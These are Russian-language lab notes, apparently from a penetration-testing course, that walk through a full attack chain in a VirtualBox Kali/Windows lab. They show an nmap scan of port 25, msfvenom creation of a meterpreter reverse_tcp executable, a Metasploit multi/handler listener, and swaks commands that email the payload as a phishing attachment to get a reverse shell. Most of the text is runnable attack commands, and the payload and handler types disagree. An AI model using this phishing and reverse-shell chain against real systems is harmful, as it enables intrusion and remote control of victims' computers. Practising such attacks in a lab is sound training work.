FLAG 54817fe7049221c92542027300015b601

# Подготовка
Загрузка:

Kali - kali.org
Win10:
https://cybered-my.sharepoint.com/:u:/g/personal/v_karmanov_cyber-ed_ru/EczwFh8tWtBKpjMS-lpSsUABfmTah9Vn6Q0ppHMcrxDguQ?e=Enbf8B

https://disk.yandex.ru/d/sM_-3S4QIpxjvg

Стенд из двух ВМ в одной сети. Надо настроить получение IP из DHCP виртуальной сети (иначе проблема с Windows)
Настройка VirtualBox:
File -> Tools -> Network manager. Созздать новый Host-only Networks. в нем ззадать параметры в закладке DHCP Server - Enable Server (Server Address 192.168.56.2)
На ВМ в настройках сети Settings -> Network -> Adappter1. Attached to: Host-only Adater и Name: имя нашего созданного Host-only Networks.


# Reconnaissance (разведка)
# Поиск
Поиск на Kali:
Обнаружение 
─$ nmap -sT -Pn -p 25 -sV -v 192.168.50.195
# Результат - open 25 port 


# Resource Development (Подготовка ресурсов)
# Создание нагрузки payload
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_атакующего LPORT=4444 -f exe -o upd.exe
─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.4 lport=4444 -f exe -o /home/kali/udp.exe  
# Важно правильно указать путь к файлу

# Подготовка прослушки (будет ждать сообщения от жертвы) c gjvjom. Metasploit
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_https (что мы использовали в payload)
msf exploit(handler) > set lhost IP 192.168.56.4  (что мы слушаем, в моем случае это IP атакующего) 
msf exploit(handler) > set lport 4444 (по умолчанию, но лучше поменять на 443 или другой)
msf exploit(handler) > exploit       (выролнение)


# Initial Access (Первоначальный доступ)
# Отправка фишингого письма с payload (нагрузкой), в качестве нагрузки берем соззданый ранее файл с помощью msfvenom
# swaks --to email_для_кого --from email_от_кого --server IP_адрес_жертвы --attach путь_к_фалу_payload  
# перед именем файла обязательно добавить символ @ (пример: @upd.exe)

└─$ swaks --to mike@sandbox.local --from admin@sandbox.local --server 192.168.56.3 --attach /home/kali/@udp.exe 

или находясь в папке файла запустить
└─$ swaks --to mike@sandbox.local --from admin@sandbox.local --server 192.168.56.3 --attach @udp.exe 

# Execution (Выполнение)
# эксплуатация
Metasploit покажет, что установлено соединение (обратный шелл shell), произойдет обмен байтами
meterpreter > 
# теперь можно вводить команды и работать дальше

